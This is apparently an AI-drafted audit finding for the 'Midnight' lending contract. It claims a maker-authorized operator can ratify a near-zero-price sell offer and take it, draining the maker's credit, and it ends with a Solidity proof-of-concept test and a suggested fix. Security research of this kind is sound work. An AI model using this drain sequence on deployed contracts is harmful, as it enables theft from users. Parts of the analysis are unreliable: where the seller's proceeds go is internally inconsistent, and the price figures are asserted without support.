I need to trace the exact code path through `SetterRatifier.setIsRootRatified` → `Midnight.take` to verify whether all checks can be bypassed.

### Title
Authorized operator can ratify an unfavorable sell offer and self-take it, draining the maker's credit position for near-zero tokens - (`src/ratifiers/SetterRatifier.sol` / `src/Midnight.sol`)

### Summary

`SetterRatifier.setIsRootRatified` allows any address authorized by the maker to ratify an arbitrary Merkle root on the maker's behalf. Because `Midnight.take` only guards against `offer.maker == taker` (the `SelfTake` check) and not against `isAuthorized[offer.maker][taker]`, an operator who is authorized by the maker can ratify a root containing a sell offer at `tick=0` (near-zero price) and immediately take that offer as taker in the same transaction. The maker (seller) surrenders their full credit position and receives a negligible token amount in return.

### Finding Description

**Exact code path:**

`SetterRatifier.setIsRootRatified` (line 25) permits any caller where `maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender)`:

```solidity
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    isRootRatified[maker][root] = newIsRootRatified;
``` [1](#0-0) 

`Midnight.take` then runs these checks in order: [2](#0-1) 

- **Line 346** `require(taker == msg.sender || isAuthorized[taker][msg.sender])` — operator is both `msg.sender` and `taker` → **passes**
- **Line 354** `require(offer.maker != taker, SelfTake())` — `maker != operator` → **passes** (this is the only self-dealing guard)
- **Line 355** `require(isAuthorized[offer.maker][offer.ratifier])` — maker pre-authorized `SetterRatifier` → **passes**
- **Line 356** `IRatifier(offer.ratifier).isRatified(...)` — `SetterRatifier.isRatified` checks `isRootRatified[offer.maker][root]` which the operator just set to `true` → **passes** [3](#0-2) 

**Price at `tick=0`:**

`tickToPrice(0)` evaluates to `1e36 / (1e18 + wExp(LN_ONE_PLUS_DELTA × 2910))`. With `LN_ONE_PLUS_DELTA ≈ 4.99e15` and `2910` steps, `wExp(...)` ≈ `e^{14.5} × 1e18 ≈ 2e24`, giving `tickToPrice(0) ≈ 5e11` (≈ `0.0000005` WAD). [4](#0-3) 

For a sell offer (`offer.buy=false`):
```
sellerPrice = offerPrice  (≈ 5e11)
sellerAssets = units.mulDivUp(sellerPrice, WAD)  ≈ units × 5e-7
``` [5](#0-4) 

For `units = 1e18`, `sellerAssets ≈ 500 wei`. The maker's credit decreases by `units` while they receive ~500 wei.

**The `SellerIsLiquidatable` check (line 476) does not block this** for a pure lender: after losing credit they have zero debt, so `isHealthy` returns true. [6](#0-5) 

**The existing test `testTakeAuthorizedSetterCanRatifyOnBehalf` is a direct proof-of-concept** of this exact pattern (operator ratifies root, then takes as taker), using `MAX_TICK` instead of `tick=0`: [7](#0-6) 

**Exploit flow:**
1. Maker calls `midnight.setIsAuthorized(setterRatifier, true, maker)` and `midnight.setIsAuthorized(operator, true, maker)` (normal setup for using SetterRatifier with a delegate).
2. Operator constructs a Merkle tree whose single leaf is a sell offer: `offer.buy=false`, `offer.maker=maker`, `offer.tick=0`, `offer.ratifier=setterRatifier`, `offer.maxUnits=type(uint256).max`.
3. Operator calls `setterRatifier.setIsRootRatified(maker, root, true)`.
4. Operator calls `midnight.take(offer, ratifierData, makerCreditUnits, operator, operator, address(0), hex"")`.
5. All checks pass. Maker loses `makerCreditUnits` of credit; operator gains that credit for ~0 tokens paid.

### Impact Explanation

The maker (seller) loses their entire credit position (lender balance) and receives a token amount approaching zero — a direct, concrete, irreversible financial loss proportional to the maker's credit at the time of the attack. The operator gains the credit position for negligible cost.

### Likelihood Explanation

**Preconditions required:**
- `isAuthorized[maker][setterRatifier] == true` — any maker using `SetterRatifier` with a delegate sets this.
- `isAuthorized[maker][operator] == true` — the maker must have authorized the attacker as operator.

Both conditions are the normal, intended setup for delegated offer management via `SetterRatifier`. Any user who grants an operator both authorizations (a common pattern shown in the test suite) is vulnerable. The attack is atomic (single transaction), repeatable, and requires no external oracle or admin action.

### Recommendation

Add a check in `Midnight.take` that the taker (or `msg.sender` acting as taker) is not an address authorized by the maker:

```solidity
require(!isAuthorized[offer.maker][taker], TakerIsOperatorOfMaker());
```

This closes the conflict-of-interest gap left by the existing `SelfTake` check. Alternatively, `SetterRatifier.setIsRootRatified` could record the caller and `isRatified` could reject calls where `taker == lastRatifier`, but the core-contract fix is cleaner and covers all ratifier types.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {SetterRatifier} from "../src/ratifiers/SetterRatifier.sol";
import {HashLib} from "../src/ratifiers/libraries/HashLib.sol";
import {Offer, CollateralParams, Market} from "../src/interfaces/IMidnight.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract OperatorSelfTakeExploit is BaseTest {
    SetterRatifier internal setterRatifier;

    function setUp() public override {
        super.setUp();
        setterRatifier = new SetterRatifier(address(midnight));
    }

    function testOperatorDrainsLenderCreditAtMinTick() public {
        address maker = lender;
        address operator = makeAddr("operator");
        uint256 units = 1000e18;

        // Setup: maker has credit (lend into market)
        setupMarket(market, units); // lender gets `units` credit

        uint256 makerCreditBefore = midnight.creditOf(id, maker);
        assertGt(makerCreditBefore, 0, "maker has credit");

        // Maker grants both authorizations (normal SetterRatifier usage)
        vm.prank(maker);
        midnight.setIsAuthorized(address(setterRatifier), true, maker);
        vm.prank(maker);
        midnight.setIsAuthorized(operator, true, maker);

        // Operator constructs sell offer at tick=0 (near-zero price)
        Offer memory maliciousOffer;
        maliciousOffer.market = market;
        maliciousOffer.buy = false;           // sell offer: maker is seller
        maliciousOffer.maker = maker;
        maliciousOffer.ratifier = address(setterRatifier);
        maliciousOffer.maxUnits = type(uint256).max;
        maliciousOffer.expiry = block.timestamp + 200;
        maliciousOffer.tick = 0;              // MIN_TICK → near-zero sellerAssets
        maliciousOffer.receiverIfMakerIsSeller = operator; // operator receives maker's tokens

        bytes32 root = HashLib.hashOffer(maliciousOffer);

        // Step 1: operator ratifies the unfavorable root on maker's behalf
        vm.prank(operator);
        setterRatifier.setIsRootRatified(maker, root, true);

        // Step 2: operator takes the offer as taker (buyer)
        vm.prank(operator);
        (uint256 buyerAssets, uint256 sellerAssets) =
            midnight.take(maliciousOffer, abi.encode(root, 0, new bytes32[](0)),
                          makerCreditBefore, operator, operator, address(0), hex"");

        // Assertions: maker lost all credit, received near-zero tokens
        assertEq(midnight.creditOf(id, maker), 0, "maker credit drained");
        assertLt(sellerAssets, 1000, "maker received near-zero tokens");
        assertEq(midnight.creditOf(id, operator), makerCreditBefore, "operator gained maker credit");
    }
}
```

**Expected assertions:**
- `midnight.creditOf(id, maker) == 0` — maker's entire credit position stolen
- `sellerAssets < 1000` (wei) — maker received negligible compensation
- `midnight.creditOf(id, operator) == makerCreditBefore` — operator gained the full credit position
